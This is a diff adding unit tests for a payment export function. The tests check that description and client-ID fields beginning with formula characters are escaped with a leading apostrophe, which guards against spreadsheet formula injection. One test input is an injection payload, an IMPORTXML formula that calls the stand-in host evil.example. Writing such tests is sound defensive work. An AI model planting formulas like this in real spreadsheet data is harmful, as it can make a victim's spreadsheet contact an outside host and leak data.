@@ -28,6 +28,24 @@ describe('getPaymentRow', () => {
   })
 })
 
+describe('getPaymentRow text fields', () => {
+  it.each([
+    '=IMPORTXML("https://evil.example","//a")',
+    '  =1+1',
+    '+1',
+    '-1',
+    '@SUM(A1)'
+  ])('keeps %s from running as a formula', (description) => {
+    const row = getPaymentRow({ ...payment, description, clientId: description })
+    expect(row[2]).toBe(`'${description}`)
+    expect(row[5]).toBe(`'${description}`)
+  })
+
+  it('leaves normal text alone', () => {
+    expect(getPaymentRow({ ...payment, description: 'Seña - novia' })[2]).toBe('Seña - novia')
+  })
+})
+
 describe('isValidPayment', () => {
   it('accepts a valid payment', () => {
     expect(isValidPayment(payment)).toBe(true)
